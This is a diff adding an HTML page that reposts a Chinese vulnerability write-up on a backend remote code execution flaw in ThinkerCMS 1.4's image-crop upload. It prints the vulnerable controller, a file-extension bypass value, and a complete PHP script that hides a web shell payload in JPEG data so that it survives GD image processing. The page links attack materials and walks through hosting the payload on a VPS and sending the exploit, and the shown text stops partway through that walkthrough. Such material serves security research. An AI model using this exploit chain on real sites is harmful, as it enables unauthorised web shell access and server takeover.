@@ -1,0 +1,407 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>ThinkerPHP后台远程任意代码执行漏洞分析</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>ThinkerPHP后台远程任意代码执行漏洞分析</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484108&amp;idx=1&amp;sn=d08258e0ab6d2807b2c907c026416621&amp;chksm=ec6fe5ccdb186cdaef58aa9aad89932b0c3e9a352d45cd951ae026d18171bf77ae6234cee27e&amp;scene=126&amp;sessionid=1681378765#rd">http://mp.weixin.qq.com/s?__biz=MzI5MzY2MzM0Mw==&amp;mid=2247484108&amp;idx=1&amp;sn=d08258e0ab6d2807b2c907c026416621&amp;chksm=ec6fe5ccdb186cdaef58aa9aad89932b0c3e9a352d45cd951ae026d18171bf77ae6234cee27e&amp;scene=126&amp;sessionid=1681378765#rd</a></blockquote><section class="xmteditor" style="display:none;" data-tools="&#x65B0;&#x5A92;&#x4F53;&#x7BA1;&#x5BB6;" data-label="powered by xmt.cn"/><p style="margin-bottom: 1.2em !important;">        ThinkerCMS1.4 （最新版）InputController.class.php 页面由于对$_POST等参数没有进行有效的判断和过滤，导致存在任意代码执行漏洞，允许攻击者利用漏洞全完获取Webshell权限。</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">0X01 审计与溯源发现危险代码块</h3><p style="margin-bottom: 1.2em !important;">①漏洞触发位置
+文件位置: D:\WWW\Modules\Plug\Controller\InputController.class.php （67行）
+触发函数： public function cropzoomUpload()</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">public function cropzoomUpload()
+    {
+        if(session("userinfo")==NULL)E('没有登陆！');
+        load('@.cropzoom');
+        list($width, $height) = getimagesize($_POST["imageSource"]);
+        $viewPortW = $_POST["viewPortW"];
+        $viewPortH = $_POST["viewPortH"];
+
+        $pWidth = $_POST["imageW"];
+        $pHeight =  $_POST["imageH"];
+        $ext = end(explode(".",$_POST["imageSource"]));
+        $function = returnCorrectFunction($ext);
+        $image = $function($_POST["imageSource"]);
+
+        $width = imagesx($image);
+        $height = imagesy($image);
+
+        // Resample
+        $image_p = imagecreatetruecolor($pWidth, $pHeight);
+        setTransparency($image,$image_p,$ext);
+        imagecopyresampled($image_p, $image, 0, 0, 0, 0, $pWidth, $pHeight, $width, $height);
+        imagedestroy($image);
+        $widthR = imagesx($image_p);
+        $hegihtR = imagesy($image_p);
+
+        $selectorX = $_POST["selectorX"];
+        $selectorY = $_POST["selectorY"];
+
+        if($_POST["imageRotate"]){
+            $angle = 360 - $_POST["imageRotate"];
+            $image_p = imagerotate($image_p,$angle,0);
+
+            $pWidth = imagesx($image_p);
+            $pHeight = imagesy($image_p);
+
+            //print $pWidth."---".$pHeight;
+
+            $diffW = abs($pWidth - $widthR) / 2;
+            $diffH = abs($pHeight - $hegihtR) / 2;
+
+            $_POST["imageX"] = ($pWidth &gt; $widthR ? $_POST["imageX"] - $diffW : $_POST["imageX"] + $diffW);
+            $_POST["imageY"] = ($pHeight &gt; $hegihtR ? $_POST["imageY"] - $diffH : $_POST["imageY"] + $diffH);
+
+
+        }
+
+
+
+        $dst_x = $src_x = $dst_y = $src_y = 0;
+
+        if($_POST["imageX"] &gt; 0){
+            $dst_x = abs($_POST["imageX"]);
+        }else{
+            $src_x = abs($_POST["imageX"]);
+        }
+        if($_POST["imageY"] &gt; 0){
+            $dst_y = abs($_POST["imageY"]);
+        }else{
+            $src_y = abs($_POST["imageY"]);
+        }
+
+
+        $viewport = imagecreatetruecolor($_POST["viewPortW"],$_POST["viewPortH"]);
+        setTransparency($image_p,$viewport,$ext);
+
+        imagecopy($viewport, $image_p, $dst_x, $dst_y, $src_x, $src_y, $pWidth, $pHeight);
+
+        imagedestroy($image_p);
+
+
+        $selector = imagecreatetruecolor($_POST["selectorW"],$_POST["selectorH"]);
+
+        setTransparency($viewport,$selector,$ext);
+        imagecopy($selector, $viewport, 0, 0, $selectorX, $selectorY,$_POST["viewPortW"],$_POST["viewPortH"]);
+
+        //获取图片内容
+        //var_dump($_POST);
+        ob_start();
+        parseImage($ext,$selector);
+        $img = ob_get_contents();
+        ob_end_clean();
+
+        if(filter_var($_POST["imageSource"], FILTER_VALIDATE_URL))
+        {
+            $urlinfo=parse_url($_POST["imageSource"]);
+            $path=$urlinfo['path'];
+            $pathinfo=pathinfo($path);
+
+        }
+        else
+        {
+            $path=$_POST["imageSource"];
+            $pathinfo=pathinfo($_POST["imageSource"]);
+
+        }
+        $file_name=$pathinfo['filename'].'_crop.'.$pathinfo['extension'];//剪切后的图片名称
+        $file_path='.'.$pathinfo['dirname'].'/'.$file_name;
+
+        file_put_contents($file_path, $img);
+        echo C('upload_host').$pathinfo['dirname'].'/'.$file_name;
+        imagedestroy($viewport);
+    }</code></pre><p style="margin-bottom: 1.2em !important;">在这里我们可以观察发现<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">public function cropzoomUpload()</code>函数的大概操作流程:</p><ol style="" class=" list-paddingleft-2"><li><p style="margin-top: 0.5em !important; margin-bottom: 0.5em !important;">接受了包括<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["viewPortW"]</code>，<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["viewPortH"]</code>，<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]</code>等一系列的图片剪切的参数</p></li><li><p style="margin-top: 0.5em !important; margin-bottom: 0.5em !important;">使用这些参数，并调用<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">php-GD</code>库对图片进行渲染和处理</p></li><li><p style="margin-top: 0.5em !important; margin-bottom: 0.5em !important;">将处理后的图片输出到缓冲区，将缓冲区作为图片的内容</p></li><li><p style="margin-top: 0.5em !important; margin-bottom: 0.5em !important;">然后将再根据<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]</code>参数进行<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">pathinfo</code>处理，将结果存到<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$pathinfo</code>，并组合成为写文件的路径<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$file_path</code></p></li><li><p style="margin-top: 0.5em !important; margin-bottom: 0.5em !important;">将缓冲区内容通过file_put_contents写入指定的<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$file_path</code>（此处直接写入Webshell，获取Web权限）</p><p style="margin-top: 0.5em !important; margin-bottom: 0.5em !important;"><br/></p></li></ol><p style="margin-bottom: 1.2em !important;">②ByPass （绕过文件后缀名检测，绕过php-GD对图片的渲染和处理导致webshell代码错位失效）</p><p style="margin-bottom: 1.2em !important;"><strong>绕过文件后缀名检测</strong>cropzoom 图片剪切相关的函数
+文件位置: D:\WWW\Modules\Plug\Common\cropzoom.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+/*
+* cropzoom 图片剪切相关的函数
+*/
+function determineImageScale($sourceWidth, $sourceHeight, $targetWidth, $targetHeight) {
+    $scalex =  $targetWidth / $sourceWidth;
+    $scaley =  $targetHeight / $sourceHeight;
+    return min($scalex, $scaley);
+}
+
+function returnCorrectFunction($ext){
+    $function = "";
+    switch($ext){
+        case "png":
+            $function = "imagecreatefrompng";
+            break;
+        case "jpeg":
+            $function = "imagecreatefromjpeg";
+            break;
+        case "jpg":
+            $function = "imagecreatefromjpeg";
+            break;
+        case "gif":
+            $function = "imagecreatefromgif";
+            break;
+    }
+    return $function;
+}
+
+function parseImage($ext,$img){
+    switch($ext){
+        case "png":
+            return imagepng($img);
+            break;
+        case "jpeg":
+            return imagejpeg($img);
+            break;
+        case "jpg":
+            return imagejpeg($img);
+            break;
+        case "gif":
+            return imagegif($img);
+            break;
+    }
+}
+
+function setTransparency($imgSrc,$imgDest,$ext){
+
+    if($ext == "png" || $ext == "gif"){
+        $trnprt_indx = imagecolortransparent($imgSrc);
+        // If we have a specific transparent color
+        if ($trnprt_indx &gt;= 0) {
+            // Get the original image's transparent color's RGB values
+            $trnprt_color    = imagecolorsforindex($imgSrc, $trnprt_indx);
+            // Allocate the same color in the new image resource
+            $trnprt_indx    = imagecolorallocate($imgDest, $trnprt_color['red'], $trnprt_color['green'], $trnprt_color['blue']);
+            // Completely fill the background of the new image with allocated color.
+            imagefill($imgDest, 0, 0, $trnprt_indx);
+            // Set the background color for new image to transparent
+            imagecolortransparent($imgDest, $trnprt_indx);
+        }
+        // Always make a transparent background color for PNGs that don't have one allocated already
+        elseif ($ext == "png") {
+            // Turn off transparency blending (temporarily)
+            imagealphablending($imgDest, true);
+            // Create a new transparent color for image
+            $color = imagecolorallocatealpha($imgDest, 0, 0, 0, 127);
+            // Completely fill the background of the new image with allocated color.
+            imagefill($imgDest, 0, 0, $color);
+            // Restore transparency blending
+            imagesavealpha($imgDest, true);
+        }
+
+    }
+}
+
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">对文件后缀名的处理包括主要通过<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]</code>这个变量的值，包括两部分
+1.获取<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]的值</code>，使用end和explode获得路径的后缀，根据路径后缀使用对应的php-GD库函数进行处理</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">        $ext = end(explode(".",$_POST["imageSource"]));
+        $function = returnCorrectFunction($ext);
+        $image = $function($_POST["imageSource"]);</code></pre><p style="margin-bottom: 1.2em !important;">2.同样是根据的<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]</code>值进行判断进入不同的分支，然后组合成为<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$file_path （file_put_contents的路径参数）</code></p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">if(filter_var($_POST["imageSource"], FILTER_VALIDATE_URL))
+        {
+            $urlinfo=parse_url($_POST["imageSource"]);
+            $path=$urlinfo['path'];
+            $pathinfo=pathinfo($path);
+
+        }
+        else
+        {
+            $path=$_POST["imageSource"];
+            $pathinfo=pathinfo($_POST["imageSource"]);
+
+        }
+        $file_name=$pathinfo['filename'].'_crop.'.$pathinfo['extension'];//剪切后的图片名称
+        $file_path='.'.$pathinfo['dirname'].'/'.$file_name;
+
+        file_put_contents($file_path, $img);</code></pre><p style="margin-bottom: 1.2em !important;">绕过办法，令<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]</code>为</p><blockquote style="margin-top: 1.2em; margin-bottom: 1.2em; border-left-width: 4px; border-left-color: rgb(221, 221, 221); padding-right: 1em; padding-left: 1em; color: rgb(119, 119, 119); quotes: none;"><p style="margin-bottom: 1.2em !important;">&lt;http://127.0.0.1/payload_faith4444_crop.php?1.jpg</p></blockquote><p style="margin-bottom: 1.2em !important;">1、使用end函数 所以加入使用 ?1.jpg 作为请求的参数进行绕过，不然会因为找不到函数报错终止。因为程序会调用<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">returnCorrectFunction()</code>函数根据后缀（此处为JPG）进行调用其他<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">php-GD</code>函数</p><p style="margin-bottom: 1.2em !important;">2、因为使用的pathinfo()处理<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_POST["imageSource"]</code>，所以 前半部分为 payload_faith4444_crop.php</p><p style="margin-bottom: 1.2em !important;">至此，成功绕过文件后缀名检测</p><p style="margin-bottom: 1.2em !important;">绕过php-GD对图片的渲染和处理导致webshell代码错位失效(此处参考索马里海盗方法)</p><p style="margin-bottom: 1.2em !important;">图片会经过php-GD处理，会导致webshell语句错位失效，如何在处理后仍然保留shell语句呢？</p><p style="margin-bottom: 1.2em !important;">在正常图片中插入shell并无视GD图像库的处理，常规方法有两种
+1、对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行
+2、利用php-gd算法上的问题进行绕过</p><p style="margin-bottom: 1.2em !important;">这里我们选择第二种，使用脚本进行处理图片并绕过
+1、上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg
+2、执行图片处理脚本脚本进行处理 php jpg_payload.php x.jpg
+3、如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留webshell代码语句</p><h4 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.2em;">Tips：</h4><p style="margin-bottom: 1.2em !important;">1、图片找的稍微大一点 成功率更高 </p><p style="margin-bottom: 1.2em !important;">2、shell语句越短成功率越高 </p><p style="margin-bottom: 1.2em !important;">3、一张图片不行就换一张 不要死磕</p><p style="margin-bottom: 1.2em !important;">图片处理脚本，还有具体操作会在验证部分详细写出！！！</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">0X02 测试与利用</h3><p style="margin-bottom: 1.2em !important;">漏洞复现材料（cms源码，攻击脚本，攻击图片） ：链接：http://pan.baidu.com/s/1eSmtiSE 密码：tsna
+（自己的php-web环境的vps上,一定要是phpweb环境（并开启短标签），phpweb环境（并开启短标签），其他环境也可，但需要自行构造payload所需的图片）
+本地验证。</p><p style="margin-bottom: 1.2em !important;"> ①首先登陆后台</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxLAkz08PibpYTDrBwoPW7MCmzVNhX6K6tS4nIA57RbLSnKoXDE0CnHBQ/0?wx_fmt=png" class="" data-type="png" data-ratio="0.3725806451612903" data-w="1240" src="../Images/404438d98a9373441c2ed00d69d22e74.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxLAkz08PibpYTDrBwoPW7MCmzVNhX6K6tS4nIA57RbLSnKoXDE0CnHBQ/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZx4GRcH92SxDiahY3wMTxypDLsEefxFc0cBqsQSs5Y78FBIWz5BGvhlnw/0?wx_fmt=png" class="" data-type="png" data-ratio="0.3683206106870229" data-w="1048" src="../Images/5c2f8960ac0a2854f4e3a8c1703ced06.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZx4GRcH92SxDiahY3wMTxypDLsEefxFc0cBqsQSs5Y78FBIWz5BGvhlnw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">②生成能经过php-GD处理后仍然能够保留webshell语句的图片
+首先准备一张图片，并重名faith.php</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxQlngzvg4pqFKVSVEGibZQdN1WH4mr6Tt52ibI0oNUno6UrkqS0jhgU3A/0?wx_fmt=png" class="" data-type="png" data-ratio="1.2098765432098766" data-w="81" src="../Images/2d7a73f12b8fd772943ccb4c80435d9f.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxQlngzvg4pqFKVSVEGibZQdN1WH4mr6Tt52ibI0oNUno6UrkqS0jhgU3A/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">过GD处理渲染的处理脚本</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+    /*
+
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations
+    caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed
+    image.
+
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    php jpg_payload.php &lt;jpg_name.jpg&gt;
+
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs "Something's wrong".
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another 
+    initial image.
+
+    Sergey Bobrov @Black2Fan.
+
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+    */
+
+    $miniPayload = "&lt;?echo'&lt;?phpinfo();?&gt;';?&gt;";
+
+    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+        die('php-gd is not installed');
+    }
+
+    if(!isset($argv[1])) {
+        die('php jpg_payload.php &lt;jpg_name.jpg&gt;');
+    }
+
+    set_error_handler("custom_error_handler");
+
+    for($pad = 0; $pad &lt; 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis-&gt;readShort() != 0xFFD8) {
+            die('Incorrect SOI marker');
+        }
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+            $marker = $dis-&gt;readByte();
+            $size = $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis-&gt;seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat("\0",$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis-&gt;eof())) {
+                        if($dis-&gt;readByte() === 0xFF) {
+                            if($dis-&gt;readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis-&gt;seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat("\0",$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage('payload_'.$argv[1], $outStream)) {
+                    die('Success!');
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink('payload_'.$argv[1]);
+    die('Something\'s wrong');
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this-&gt;binData = '';
+            $this-&gt;order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die('File not exists ['.$filename.']');
+                $this-&gt;binData = file_get_contents($filename);
+            } else {
+                $this-&gt;binData = $filename;
+            }
+            $this-&gt;size = strlen($this-&gt;binData);
+        }
+
+        public function seek() {
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        }
+
+        public function skip($skip) {
+            $this-&gt;binData = substr($this-&gt;binData, $skip);
+        }
+
+        public function readByte() {
+            if($this-&gt;eof()) {
+                die('End Of File');
+            }
+            $byte = substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData = substr($this-&gt;binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this-&gt;binData) &lt; 2) {
+                die('End Of File');
+            }
+            $short = substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData = substr($this-&gt;binData, 2);
+            if($this-&gt;order) {
+                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+        }
+    }
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">使用脚本进行处理，新生成的文件就能过GD</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxpVKOTW4w6QQvNOzqjsV5fL2CaDOPZpwAmaTiahuAeuRjbywugY4t1Zw/0?wx_fmt=png" class="" data-type="png" data-ratio="0.43956043956043955" data-w="273" src="../Images/255c9bc5039a911cad0ea65efb77a56e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxpVKOTW4w6QQvNOzqjsV5fL2CaDOPZpwAmaTiahuAeuRjbywugY4t1Zw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">过GD的新文件 payload_faith.php</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxRFG9KEIhr0ic3zTFMJuolA6mP8HhOWvOuB5HpMUaSorEnjMEUXlqsgw/0?wx_fmt=png" class="" data-type="png" data-ratio="1.3066666666666666" data-w="75" src="../Images/f8dfe475587c1f6e02ce689b23238a67.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxRFG9KEIhr0ic3zTFMJuolA6mP8HhOWvOuB5HpMUaSorEnjMEUXlqsgw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">然后将新文件放到自己的php-web环境的vps上,一定要是phpweb环境（并开启短标签），phpweb环境（并开启短标签，php默认开启）（因为payload是php语句），其他环境也可，但需要自行构造payload所需的图片</p><p style="margin-bottom: 1.2em !important;">http://your_vps/payload_faith.php</p><p style="margin-bottom: 1.2em !important;">③将各个参数补齐，发送最后的Payload
+查看原图的长宽高</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZx1P51N6V17GF7wIsia3qdy4Ug7VNB3IxPANb0noQ0K5yl7iciayB4xm9ag/0?wx_fmt=png" class="" data-type="png" data-ratio="0.8973747016706444" data-w="419" src="../Images/dd722e210c0b3b605d1dbd70a882755c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZx1P51N6V17GF7wIsia3qdy4Ug7VNB3IxPANb0noQ0K5yl7iciayB4xm9ag/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">w=x2=图片宽度
+h=y2=图片高度
+x1=y1=固定0
